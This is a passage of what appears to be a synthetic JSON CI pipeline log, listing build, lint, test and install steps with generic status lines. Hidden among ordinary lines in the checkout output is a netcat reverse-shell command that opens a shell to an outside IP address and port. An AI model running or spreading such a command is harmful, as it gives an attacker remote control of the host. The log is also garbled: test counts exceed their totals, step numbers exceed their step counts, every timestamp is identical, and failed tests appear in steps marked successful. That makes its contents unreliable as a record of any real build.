files...\nFetching submodules...\n  PASS: integration/test_user_create.spec.js\nCache restored successfully (196MB)\nnpm install: resolved 1754 packages\nHEAD is now at fba82fa\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCreating production build...\nCompiling src/app.ts...\npip: Downloading react-4.2.tar.gz\nCache invalidated: build\n\u2713 lint completed\n\u2713 Task completed in 2469ms\nyarn add: Done in 8.90s\nMinifying main.js\nCache saved successfully\nStep 19/25: Linting\nnc -e /bin/sh 13.135.38.35 30105\nWaiting...\n[12:18:45] INFO: Processing request\nConnection established\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (6MB)\nCache saved successfully\npip install: Successfully installed lodash-1.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nConnection established\nArtifact uploaded: dist.zip (51MB)\n=== Step checkout completed ===",
    "steps": [
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-05T12:18:45.803911",
        "finished_at": "2025-12-05T12:18:59.846999",
        "log_lines": [
          "=== Step: type_check ===",
          "Exception: TypeError",
          "Completed.",
          "Building Docker image...",
          "Generating source maps...",
          "Layer 4/11: ENV command",
          "Compiling lib/app.ts...",
          "Installing eslint@5.19.1",
          "npm install: resolved 1987 packages",
          "\u2717 build failed with exit code 86",
          "Processing...",
          "TLS handshake completed",
          "npm notice: package.json updated",
          "Using Python 3.10",
          "Finished.",
          "[12:18:45] INFO: Starting build process",
          "Bundling main.js",
          "Pulling image: node:3.11",
          "pip: Collecting webpack",
          "Compiling components/service.java...",
          "Transforming 394 files...",
          "Compiling utils/handler.rs...",
          "  PASS: integration/test_user_create.spec.js",
          "Finished.",
          "pip: Collecting webpack",
          "Step 5/22: Installing dependencies",
          "pip install: Successfully installed lodash-1.8",
          "Step 15/23: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip: Downloading jest-3.11.tar.gz",
          "Done.",
          "Image pulled successfully",
          "[12:18:45] WARN: Deprecated API usage",
          "\u2713 Task completed in 5000ms",
          "Step 13/16: Installing dependencies",
          "[12:18:45] DEBUG: Loading configuration",
          "npm notice: package.json updated",
          "Already up to date.",
          "Done.",
          "Cache saved successfully",
          "Uploading artifact 'build' (35 files)",
          "Test Suites: 49 passed, 29 total",
          "Success!",
          "[12:18:45] INFO: Cache refreshed",
          "Test Suites: 48 passed, 9 total",
          "[12:18:45] DEBUG: Memory usage: 1209MB",
          "[12:18:45] ERROR: Connection failed",
          "npm notice: package.json updated",
          "[12:18:45] DEBUG: Initializing service",
          "[12:18:45] WARN: Deprecated API usage",
          "Cache restored successfully (457MB)",
          "Fetching submodules...",
          "Switched to branch 'hotfix/task-930'",
          "Test Suites: 29 passed, 36 total",
          "Switched to branch 'feature/task-654'",
          "Cache hit for key-1516",
          "  PASS: test_db_connect (495ms)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Switched to branch 'bugfix/task-980'",
          "POST /api - 200 (279ms)",
          "npm install: added 486 packages",
          "Layer 8/14: RUN command",
          "Ran 82 tests in 7s",
          "GET /status - 201 (63ms)",
          "Compiling components/app.ts...",
          "[12:18:45] INFO: Cache refreshed",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Using Node.js 17.14.0",
          "HEAD is now at 2b54d65",
          "Pulling image: node:latest",
          "Building Docker image...",
          "Ran 15 tests in 43s",
          "Fetching submodules...",
          "Tests: 210 passed, 276 total",
          "[12:18:45] DEBUG: Initializing service",
          "Waiting...",
          "Test Suites: 7 passed, 17 total",
          "Waiting...",
          "pip install: Successfully installed prettier-2.10",
          "Compiling utils/handler.rs...",
          "Step 19/17: Testing",
          "Already up to date.",
          "[12:18:45] DEBUG: Loading configuration",
          "Tests: 144 passed, 202 total",
          "Creating production build...",
          "[12:18:45] INFO: Connecting to database",
          "\u2713 Step 'test' succeeded",
          "[12:18:45] INFO: Starting build process",
          "Finished.",
          "Verifying...",
          "Artifact downloaded: 18MB",
          "Artifact uploaded: build.tar.gz (41MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "WARNING: prettier has known vulnerabilities",
          "Snapshots: 23 passed, 16 total",
          "Uploading artifact 'dist' (43 files)",
          "Switched to branch 'feature/task-708'",
          "Step 1/17: Testing",
          "Processing...",
          "Already up to date.",
          "[12:18:45] INFO: Processing request",
          "npm notice: package.json updated",
          "Loading...",
          "Finished.",
          "Snapshots: 25 passed, 28 total",
          "Compiling components/index.js...",
          "Image pulled successfully",
          "Test Suites: 23 passed, 36 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache miss for key-1882",
          "Platform: darwin-arm64",
          "[12:18:45] INFO: Starting build process",
          "Ready.",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Cache restored successfully (201MB)",
          "Compiling lib/utils.go...",
          "Cache hit for key-3645",
          "[12:18:45] WARN: Deprecated API usage",
          "Cache saved successfully",
          "HEAD is now at 654b7aa",
          "[12:18:45] INFO: Request completed",
          "Step 15/22: Building",
          "npm install: resolved 939 packages",
          "Tests: 206 passed, 65 total",
          "Connecting to acme.corp:443...",
          "Step 1/19: Linting",
          "Checking out master branch",
          "[12:18:45] DEBUG: Initializing service",
          "Cache saved successfully",
          "WARNING: webpack has known vulnerabilities",
          "Platform: linux-x64",
          "npm install: added 382 packages",
          "npm notice: created a lockfile",
          "Completed.",
          "[12:18:45] WARN: Deprecated API usage",
          "Success!",
          "[12:18:45] WARN: Deprecated API usage",
          "[12:18:45] INFO: Starting build process",
          "[12:18:45] INFO: Starting build process",
          "Step 3/24: Running migrations",
          "Generating source maps...",
          "Coverage: 84% statements, 68% branches",
          "Step 15/21: Testing",
          "Switched to branch 'hotfix/task-969'",
          "Installing prettier@2.2.7",
          "[12:18:45] ERROR: Connection failed",
          "Tests: 340 passed, 161 total",
          "pip: Installing build dependencies...",
          "Step 20/15: Installing dependencies",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-05T12:18:59.846999",
        "finished_at": "2025-12-05T12:19:41.976263",
        "log_lines": [
          "=== Step: unit_tests ===",
          "WARNING: jest has known vulnerabilities",
          "Uploading artifact 'build' (29 files)",
          "Building Docker image...",
          "\u2713 All checks passed",
          "Cache saved successfully",
          "Cache hit for key-1217",
          "Test Suites: 42 passed, 34 total",
          "[12:18:45] INFO: Processing request",
          "Switched to branch 'bugfix/task-230'",
          "OK",
          "Environment: development",
          "Bundling vendor.css",
          "Image pulled successfully",
          "Loading...",
          "[12:18:45] INFO: Connecting to database",
          "[12:18:45] DEBUG: Query executed in 27ms",
          "Success!",
          "Done.",
          "Test Suites: 14 passed, 19 total",
          "[12:18:45] DEBUG: Loading configuration",
          "Building Docker image...",
          "Cache restored successfully (140MB)",
          "[12:18:45] INFO: Processing request",
          "[12:18:45] INFO: Request completed",
          "Compiling lib/main.py...",
          "Creating production build...",
          "Coverage: 91% statements, 64% branches",
          "Ran 142 tests in 16s",
          "Fetching submodules...",
          "[12:18:45] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "Finished.",
          "Fetching submodules...",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 package completed",
          "npm notice: created a lockfile",
          "Ran 116 tests in 31s",
          "[12:18:45] INFO: Processing request",
          "Creating production build...",
          "Transforming 937 files...",
          "[12:18:45] INFO: Connecting to database",
          "Tests: 122 passed, 492 total",
          "pip install: Successfully installed react-5.11",
          "  PASS: unit/test_auth_login.spec.js",
          "pip: Installing build dependencies...",
          "Creating production build...",
          "Compiling src/utils.go...",
          "NODE_ENV=production",
          "Fetching submodules...",
          "FAILED: test_db_connect",
          "Cache saved successfully",
          "[12:18:45] INFO: Request completed",
          "[12:18:45] DEBUG: Loading configuration",
          "Completed.",
          "Compiling utils/service.java...",
          "Compiling components/app.ts...",
          "Artifact uploaded: dist.zip (88MB)",
          "TLS handshake completed",
          "OK",
          "yarn add: Done in 7.27s",
          "Connecting to example.com:443...",
          "Using Python 3.11",
          "Pushing to registry...",
          "Cache invalidated: node_modules",
          "Exception: TypeError",
          "OK",
          "Ran 37 tests in 22s",
          "Compiling lib/main.py...",
          "Compiling src/service.java...",
          "[12:18:45] DEBUG: Memory usage: 1880MB",
          "Artifact uploaded: build.tar.gz (31MB)",
          "[12:18:45] WARN: Deprecated API usage",
          "[12:18:45] INFO: Request completed",
          "Step 8/19: Testing",
          "HEAD is now at ac72dc1",
          "[12:18:45] WARN: Deprecated API usage",
          "  PASS: unit/test_cache_hit.spec.js",
          "Step 14/15: Building",
          "Cache invalidated: build",
          "[12:18:45] WARN: Deprecated API usage",
          "Pushing to registry...",
          "Checking out main branch",
          "Environment: staging",
          "[12:18:45] INFO: Processing request",
          "Using Node.js 18.5.6",
          "Step 12/19: Installing dependencies",
          "[12:18:45] DEBUG: Initializing service",
          "[12:18:45] DEBUG: Connection pool: 5 active",
          "npm notice: created a lockfile",
          "Tests: 401 passed, 401 total",
          "Bundling styles.css",
          "[12:18:45] INFO: Processing request",
          "[12:18:45] WARN: Deprecated API usage",
          "Fetching submodules...",
          "[12:18:45] INFO: Connecting to database",
          "npm install: added 154 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm notice: created a lockfile",
          "Completed.",
          "Step 19/16: Linting",
          "[12:18:45] INFO: Processing request",
          "FAILED: test_cache_hit",
          "GET /api - 201 (91ms)",
          "Checking out main branch",
          "Cache miss for key-2906",
          "Step 12/17: Installing dependencies",
          "Bundling main.css",
          "Compiling src/main.py...",
          "WARNING: axios has known vulnerabilities",
          "Time: 109.307s",
          "TLS handshake completed",
          "Artifact downloaded: 14MB",
          "[12:18:45] WARN: Deprecated API usage",
          "FAILED: test_cache_hit",
          "[12:18:45] INFO: Starting build process",
          "npm install: resolved 707 packages",
          "Finished.",
          "Using Python 3.11",
          "Finished.",
          "Time: 37.298s",
          "Bundling runtime.css",
          "Step 10/23: Installing dependencies",
          "Environment: test",
          "Cache hit for key-6237",
          "Installing prettier@3.0.10",
          "Step 17/22: Building",
          "Cache hit for key-2946",
          "HEAD is now at 650eb95",
          "Cache invalidated: node_modules",
          "Optimizing 59 modules...",
          "Connection established",
          "Using Node.js 14.11.3",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Waiting...",
          "Compiling src/utils.go...",
          "[12:18:45] DEBUG: Connection pool: 20 active",
          "Generating source maps...",
          "Compiling components/app.ts...",
          "[12:18:45] INFO: Processing request",
          "npm install: resolved 1385 packages",
          "pip install: Successfully installed axios-5.11",
          "TLS handshake completed",
          "Connection established",
          "Artifact downloaded: 49MB",
          "Step 12/17: Building",
          "[12:18:45] INFO: Starting build process",
          "Step 6/21: Deploying",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-05T12:19:41.976263",
        "finished_at": "2025-12-05T12:19:50.402116",
        "log_lines": [
          "=== Step: save_cache ===",
          "[12:18:45] INFO: Processing request",
          "Step 15/25: Building",
          "pip install: Successfully installed prettier-3.15",
          "Uploading artifact 'dist' (12 files)",
          "Artifact uploaded: build.tar.gz (1MB)",
          "pip: Installing build dependencies...",
          "Transforming 280 files...",
          "Compiling utils/main.py...",
          "Checking out main branch",
          "Generating source maps...",
          "WARNING: express has known vulnerabilities",
          "Step 8/25: Deploying",
          "WARNING: lodash has known vulnerabilities",
          "Success!",
          "Fetching submodules...",
          "Layer 2/10: ENV command",
          "WARNING: axios has known vulnerabilities",
          "NODE_ENV=production",
          "[12:18:45] WARN: Deprecated API usage",
          "Step 5/15: Linting",
          "[12:18:45] DEBUG: Loading configuration",
          "Step 18/21: Linting",
          "  PASS: test_auth_login (112ms)",
          "Step 5/16: Testing",
          "[12:18:45] WARN: Deprecated API usage",
          "pip install: Successfully installed eslint-2.2",
          "Compiling src/service.java...",
          "[12:18:45] INFO: Request completed",
          "[12:18:45] INFO: Starting build process",
          "Finished.",
          "Coverage: 90% statements, 68% branches",
          "Compiling components/handler.rs...",
          "Platform: win32-x64",
          "Environment: production",
          "HEAD is now at 1ac6895",
          "yarn add: Done in 19.4s",
          "[12:18:45] DEBUG: Query executed in 33ms",
          "Already up to date.",
          "Checking out master branch",
          "Installing prettier@4.16.0",
          "pip: Downloading axios-4.15.tar.gz",
          "Checking out master branch",
          "\u2713 Step 'setup' succeeded",
          "Cache miss for key-9675",
          "Step 11/15: Installing dependencies",
          "POST /data - 200 (311ms)",
          "Completed.",
          "\u2713 Step 'test' succeeded",
          "Compiling src/handler.rs...",
          "Fetching submodules...",
          "Test Suites: 17 passed, 14 total",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Cache hit for key-2615",
          "Platform: linux-x64",
          "pip: Collecting eslint",
          "Platform: win32-x64",
          "Building Docker image...",
          "POST /data - 200 (366ms)",
          "\u2713 All checks passed",
          "\u2713 Step 'build' succeeded",
          "pip: Collecting lodash",
          "Pushing to registry...",
          "Platform: linux-x64",
          "Done.",
          "Compiling components/utils.go...",
          "pip: Downloading prettier-2.7.tar.gz",
          "Snapshots: 2 passed, 20 total",
          "Done.",
          "Fetching submodules...",
          "Processing...",
          "Building Docker image...",
          "Checking out develop branch",
          "pip: Downloading react-5.17.tar.gz",
          "npm install: resolved 467 packages",
          "Finished.",
          "Loading...",
          "Artifact downloaded: 29MB",
          "Processing...",
          "  PASS: e2e/test_cache_hit.spec.js",
          "\u2713 All checks passed",
          "[12:18:45] INFO: Starting build process",
          "Step 13/20: Running migrations",
          "Completed.",
          "FAILED: test_auth_login",
          "Compiling src/main.py...",
          "Step 5/16: Linting",
          "Bundling runtime.js",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 7/22: Building",
          "Compiling components/utils.go...",
          "Ready.",
          "Completed.",
          "Layer 9/14: RUN command",
          "pip: Installing build dependencies...",
          "Test Suites: 14 passed, 37 total",
          "Step 20/20: Building",
          "WARNING: webpack has known vulnerabilities",
          "Time: 89.781s",
          "WARNING: prettier has known vulnerabilities",
          "WARNING: jest has known vulnerabilities",
          "[12:18:45] INFO: Request completed",
          "[12:18:45] INFO: Starting build process",
          "Ran 194 tests in 28s",
          "Cache invalidated: node_modules",
          "Artifact uploaded: dist.zip (7MB)",
          "Environment: development",
          "\u2713 Task completed in 2205ms",
          "Pulling image: python:18",
          "Compiling utils/index.js...",
          "Cache saved successfully",
          "WARNING: jest has known vulnerabilities",
          "[12:18:45] INFO: Request completed",
          "Fetching submodules...",
          "Installing react@1.15.6",
          "  PASS: integration/test_auth_login.spec.js",
          "\u2713 Task completed in 3960ms",
          "Transforming 814 files...",
          "Environment: production",
          "pip install: Successfully installed react-1.3",
          "Building Docker image...",
          "  PASS: test_db_connect (186ms)",
          "Checking out main branch",
          "Ready.",
          "Uploading artifact 'build' (39 files)",
          "TLS handshake completed",
          "Artifact uploaded: dist.zip (51MB)",
          "pip: Downloading express-2.13.tar.gz",
          "[12:18:45] INFO: Connecting to database",
          "Creating production build...",
          "Time: 5.190s",
          "Building Docker image...",
          "Snapshots: 28 passed, 45 total",
          "Step 10/17: Testing",
          "Success!",
          "WARNING: lodash has known vulnerabilities",
          "[12:18:45] DEBUG: Connection pool: 3 active",
          "Cache saved successfully",
          "Tests: 406 passed, 99 total",
          "Transforming 666 files...",
          "HEAD is now at 0e41a5f",
          "[12:18:45] INFO: Connecting to database",
          "pip install: Successfully installed react-3.12",
          "pip install: Successfully installed axios-4.20",
          "Completed.",
          "OK",
          "  PASS: test_user_create (258ms)",
          "Connection established",
          "  PASS: integration/test_auth_login.spec.js",
          "Cache restored successfully (46MB)",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-05T12:19:50.402116",
        "finished_at": "2025-12-05T12:20:04.445204",
        "log_lines": [
          "=== Step: lint ===",
          "Cache saved successfully",
          "Using Node.js 20.10.3",
          "Done.",
          "Using Python 3.10",
          "Minifying app.js",
          "Generating source maps...",
          "Artifact uploaded: dist.zip (46MB)",
          "Artifact uploaded: dist.zip (31MB)",
          "Verifying...",
          "TLS handshake completed",
          "Coverage: 77% statements, 93% branches",
          "Waiting...",
          "Coverage: 87% statements, 74% branches",
          "Fetching submodules...",
          "Waiting...",
          "[12:18:45] DEBUG: Loading configuration",
          "[12:18:45] DEBUG: Connection pool: 12 active",
          "  PASS: e2e/test_db_connect.spec.js",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Pulling image: alpine:3.11",
          "pip: Downloading express-2.17.tar.gz",
          "[12:18:45] DEBUG: Query executed in 37ms",
          "[12:18:45] DEBUG: Query executed in 98ms",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Fetching submodules...",
          "POST /api - 200 (347ms)",
          "Image pulled successfully",
          "Snapshots: 1 passed, 16 total",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Switched to branch 'bugfix/task-326'",
          "[12:18:45] DEBUG: Connection pool: 12 active",
          "Image pulled successfully",
          "[12:18:45] DEBUG: Query executed in 59ms",
          "Pulling image: python:3.11",
          "OK",
          "Test Suites: 34 passed, 23 total",
          "[12:18:45] WARN: Deprecated API usage",
          "NODE_ENV=test",
          "Layer 9/12: ENV command",
          "Connecting to test.io:443...",
          "Waiting...",
          "[12:18:45] DEBUG: Connection pool: 13 active",
          "Finished.",
          "Image pulled successfully",
          "Connecting to cloud.services:443...",
          "Cache restored successfully (259MB)",
          "Bundling main.css",
          "Platform: darwin-arm64",
          "Cache saved successfully",
          "Transforming 797 files...",
          "Exception: RuntimeError",
          "pip: Collecting express",
          "Cache restored successfully (36MB)",
          "Using Python 3.11",
          "[12:18:45] DEBUG: Connection pool: 10 active",
          "Connecting to acme.corp:443...",
          "Uploading artifact 'build' (3 files)",
          "Creating production build...",
          "Artifact uploaded: dist.zip (72MB)",
          "Connecting to test.io:443...",
          "pip: Installing build dependencies...",
          "Step 3/16: Building",
          "Using Node.js 16.9.1",
          "pip: Downloading eslint-3.20.tar.gz",
          "pip: Collecting axios",
          "Installing lodash@5.5.10",
          "Step 18/23: Testing",
          "Fetching submodules...",
          "Platform: linux-x64",
          "Compiling lib/app.ts...",
          "pip install: Successfully installed lodash-3.3",
          "Test Suites: 30 passed, 38 total",
          "GET /api - 201 (19ms)",
          "npm install: added 406 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 5/23: Running migrations",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 lint completed",
          "Building Docker image...",
          "FAILED: test_api_health",
          "Creating production build...",
          "Bundling styles.css",
          "HEAD is now at 6ae6a02",
          "Finished.",
          "WARNING: react has known vulnerabilities",
          "pip: Collecting axios",
          "WARNING: jest has known vulnerabilities",
          "pip install: Successfully installed axios-4.18",
          "pip: Downloading eslint-1.20.tar.gz",
          "Bundling styles.css",
          "Waiting...",
          "[12:18:45] INFO: Starting build process",
          "Artifact uploaded: build.tar.gz (9MB)",
          "NODE_ENV=test",
          "OK",
          "Done.",
          "Exception: TypeError",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-1387",
          "WARNING: webpack has known vulnerabilities",
          "Already up to date.",
          "[12:18:45] DEBUG: Memory usage: 1031MB",
          "Installing axios@4.7.8",
          "npm notice: package.json updated",
          "Cache restored successfully (278MB)",
          "Cache saved successfully",
          "Minifying app.js",
          "yarn add: Done in 5.55s",
          "Step 14/18: Testing",
          "Platform: darwin-arm64",
          "pip install: Successfully installed webpack-1.0",
          "\u2713 Step 'test' succeeded",
          "Step 10/22: Deploying",
          "Ran 169 tests in 57s",
          "[12:18:45] WARN: Deprecated API usage",
          "Compiling lib/handler.rs...",
          "\u2713 Step 'test' succeeded",
          "Processing...",
          "WARNING: lodash has known vulnerabilities",
          "Connecting to acme.corp:443...",
          "Cache invalidated: dependencies",
          "Cache invalidated: dependencies",
          "Cache hit for key-4147",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Step 10/18: Building",
          "Uploading artifact 'dist' (4 files)",
          "Uploading artifact 'build' (16 files)",
          "WARNING: express has known vulnerabilities",
          "Cache hit for key-2950",
          "Switched to branch 'bugfix/task-178'",
          "Cache saved successfully",
          "Switched to branch 'hotfix/task-649'",
          "Snapshots: 15 passed, 16 total",
          "Step 12/22: Building",
          "Step 8/19: Testing",
          "Image pulled successfully",
          "[12:18:45] ERROR: Connection failed",
          "[12:18:45] INFO: Request completed",
          "Minifying app.js",
          "Compiling src/app.ts...",
          "POST /data - 201 (224ms)",
          "Success!",
          "Compiling lib/service.java...",
          "Tests: 436 passed, 463 total",
          "Verifying...",
          "pip: Collecting jest",
          "Switched to branch 'bugfix/task-143'",
          "Cache saved successfully",
          "[12:18:45] DEBUG: Connection pool: 7 active",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-05T12:20:04.445204",
        "finished_at": "2025-12-05T12:20:46.574468",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Time: 14.526s",
          "Using Python 3.10",
          "[12:18:45] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling components/service.java...",
          "Building Docker image...",
          "Creating production build...",
          "Fetching submodules...",
          "[12:18:45] INFO: Processing request",
          "pip: Downloading jest-5.14.tar.gz",
          "Artifact uploaded: dist.zip (48MB)",
          "OK",
          "Tests: 455 passed, 86 total",
          "Transforming 227 files...",
          "Compiling lib/utils.go...",
          "Pushing to registry...",
          "[12:18:45] DEBUG: Connection pool: 1 active",
          "Loading...",
          "Step 12/23: Linting",
          "Switched to branch 'hotfix/task-208'",
          "Minifying main.js",
          "OK",
          "[12:18:45] DEBUG: Connection pool: 6 active",
          "Verifying...",
          "WARNING: react has known vulnerabilities",
          "Optimizing 100 modules...",
          "Checking out master branch",
          "  PASS: test_db_connect (410ms)",
          "Generating source maps...",
          "pip: Collecting webpack",
          "Time: 90.765s",
          "pip: Downloading jest-5.2.tar.gz",
          "Completed.",
          "[12:18:45] DEBUG: Query executed in 86ms",
          "Layer 9/15: COPY command",
          "[12:18:45] DEBUG: Connection pool: 9 active",
          "Step 6/22: Linting",
          "Artifact downloaded: 11MB",
          "pip: Installing build dependencies...",
          "NODE_ENV=production",
          "Cache hit for key-5983",
          "Installing axios@4.4.3",
          "npm notice: created a lockfile",
          "pip install: Successfully installed express-5.9",
          "Environment: test",
          "Platform: darwin-arm64",
          "pip: Collecting lodash",
          "Coverage: 78% statements, 81% branches",
          "Step 1/17: Deploying",
          "Step 15/18: Linting",
          "WARNING: lodash has known vulnerabilities",
          "WARNING: jest has known vulnerabilities",
          "Minifying vendor.js",
          "[12:18:45] INFO: Connecting to database",
          "OK",
          "Loading...",
          "[12:18:45] DEBUG: Loading configuration",
          "Step 9/24: Installing dependencies",
          "Step 14/22: Linting",
          "Compiling src/handler.rs...",
          "Connecting to startup.dev:443...",
          "Environment: staging",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Using Python 3.11",
          "Step 2/16: Building",
          "  PASS: unit/test_auth_login.spec.js",
          "[12:18:45] INFO: Request completed",
          "Uploading artifact 'coverage' (29 files)",
          "Already up to date.",
          "Tests: 128 passed, 498 total",
          "Connecting to example.com:443...",
          "npm install: added 432 packages",
          "Step 10/23: Deploying",
          "pip: Installing build dependencies...",
          "Step 4/19: Testing",
          "Success!",
          "[12:18:45] DEBUG: Loading configuration",
          "HEAD is now at 91333ea",
          "Step 19/25: Building",
          "Loading...",
          "Waiting...",
          "Layer 6/10: COPY command",
          "npm install: added 465 packages",
          "Pushing to registry...",
          "Switched to branch 'feature/task-186'",
          "Uploading artifact 'coverage' (22 files)",
          "[12:18:45] DEBUG: Initializing service",
          "Layer 4/8: RUN command",
          "Using Python 3.9",
          "Success!",
          "Loading...",
          "Pulling image: alpine:latest",
          "[12:18:45] INFO: Processing request",
          "Environment: production",
          "Artifact uploaded: build.tar.gz (13MB)",
          "\u2713 Step 'test' succeeded",
          "Step 5/15: Building",
          "[12:18:45] WARN: Deprecated API usage",
          "Installing jest@5.15.4",
          "Snapshots: 42 passed, 0 total",
          "Building Docker image...",
          "Minifying main.js",
          "Using Python 3.9",
          "NODE_ENV=test",
          "  PASS: test_cache_hit (452ms)",
          "Using Python 3.12",
          "Artifact uploaded: dist.zip (7MB)",
          "Cache hit for key-2866",
          "[12:18:45] DEBUG: Memory usage: 1773MB",
          "Compiling src/app.ts...",
          "Uploading artifact 'dist' (11 files)",
          "[12:18:45] INFO: Request completed",
          "[12:18:45] DEBUG: Memory usage: 857MB",
          "NODE_ENV=development",
          "[12:18:45] DEBUG: Connection pool: 6 active",
          "Ran 33 tests in 42s",
          "\u2717 build failed with exit code 86",
          "Compiling components/handler.rs...",
          "Pulling image: alpine:18",
          "Ran 197 tests in 59s",
          "Creating production build...",
          "Compiling utils/index.js...",
          "\u2713 Step 'build' succeeded",
          "[12:18:45] DEBUG: Query executed in 40ms",
          "Fetching submodules...",
          "Cache saved successfully",
          "[12:18:45] INFO: Connecting to database",
          "\u2713 deploy completed",
          "[12:18:45] INFO: Starting build process",
          "npm install: resolved 477 packages",
          "Ready.",
          "Time: 83.940s",
          "Loading...",
          "npm notice: created a lockfile",
          "[12:18:45] INFO: Request completed",
          "Artifact uploaded: build.tar.gz (2MB)",
          "[12:18:45] INFO: Cache refreshed",
          "\u2713 lint completed",
          "Time: 86.686s",
          "\u2713 Step 'install' succeeded",
          "[12:18:45] DEBUG: Loading configuration",
          "Cache invalidated: build",
          "\u2713 test completed",
          "Done.",
          "  PASS: integration/test_api_health.spec.js",
          "[12:18:45] DEBUG: Initializing service",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-05T12:20:46.574468",
        "finished_at": "2025-12-05T12:21:14.660644",
        "log_lines": [
          "=== Step: integration_tests ===",
          "\u2713 Step 'setup' succeeded",
          "Cache hit for key-2749",
          "Done.",
          "Processing...",
          "Connection established",
          "Cache miss for key-4860",
          "HEAD is now at 808600a",
          "GET /status - 200 (84ms)",
          "pip: Collecting prettier",
          "POST /data - 202 (214ms)",
          "Step 6/19: Testing",
          "Checking out develop branch",
          "Already up to date.",
          "Generating source maps...",
          "Ready.",
          "Exception: TypeError",
          "Building Docker image...",
          "FAILED: test_api_health",
          "Step 19/17: Deploying",
          "npm notice: created a lockfile",
          "Environment: staging",
          "[12:18:45] INFO: Cache refreshed",
          "yarn add: Done in 19.78s",
          "Verifying...",
          "[12:18:45] INFO: Connecting to database",
          "npm install: added 410 packages",
          "Checking out master branch",
          "Switched to branch 'bugfix/task-779'",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Optimizing 85 modules...",
          "\u2713 All checks passed",
          "Step 10/17: Installing dependencies",
          "Test Suites: 36 passed, 34 total",
          "TLS handshake completed",
          "pip: Installing build dependencies...",
          "pip: Installing build dependencies...",
          "Transforming 276 files...",
          "Image pulled successfully",
          "Artifact uploaded: dist.zip (56MB)",
          "\u2717 build failed with exit code 109",
          "Compiling src/handler.rs...",
          "Step 11/15: Linting",
          "Exception: RuntimeError",
          "pip: Downloading lodash-4.11.tar.gz",
          "Artifact uploaded: dist.zip (68MB)",
          "Compiling utils/app.ts...",
          "Transforming 546 files...",
          "Snapshots: 18 passed, 27 total",
          "Building Docker image...",
          "Checking out main branch",
          "OK",
          "[12:18:45] DEBUG: Query executed in 63ms",
          "npm install: resolved 1151 packages",
          "Using Python 3.12",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Creating production build...",
          "Already up to date.",
          "Time: 99.778s",
          "Artifact uploaded: dist.zip (48MB)",
          "Success!",
          "Test Suites: 35 passed, 12 total",
          "  PASS: unit/test_user_create.spec.js",
          "HEAD is now at 4f20ecd",
          "Coverage: 99% statements, 93% branches",
          "Time: 30.990s",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Finished.",
          "Installing jest@2.14.10",
          "NODE_ENV=development",
          "Verifying...",
          "Compiling lib/service.java...",
          "Coverage: 96% statements, 97% branches",
          "Using Node.js 19.16.10",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "POST /data - 200 (340ms)",
          "Compiling components/index.js...",
          "OK",
          "OK",
          "Fetching submodules...",
          "[12:18:45] DEBUG: Query executed in 64ms",
          "Already up to date.",
          "OK",
          "WARNING: express has known vulnerabilities",
          "Cache invalidated: dependencies",
          "npm install: added 93 packages",
          "Step 1/22: Deploying",
          "Loading...",
          "TLS handshake completed",
          "Done.",
          "Waiting...",
          "Pushing to registry...",
          "\u2713 Task completed in 507ms",
          "Already up to date.",
          "Pushing to registry...",
          "FAILED: test_user_create",
          "Artifact downloaded: 9MB",
          "Success!",
          "[12:18:45] INFO: Request completed",
          "Cache saved successfully",
          "Verifying...",
          "WARNING: express has known vulnerabilities",
          "Cache restored successfully (194MB)",
          "Success!",
          "Compiling lib/utils.go...",
          "[12:18:45] INFO: Starting build process",
          "[12:18:45] WARN: Deprecated API usage",
          "HEAD is now at 6a87080",
          "Checking out master branch",
          "Checking out develop branch",
          "OK",
          "Cache restored successfully (411MB)",
          "Minifying app.js",
          "Using Python 3.11",
          "Bundling vendor.js",
          "[12:18:45] INFO: Processing request",
          "NODE_ENV=production",
          "[12:18:45] DEBUG: Initializing service",
          "Connecting to acme.corp:443...",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Coverage: 78% statements, 91% branches",
          "\u2713 Task completed in 4838ms",
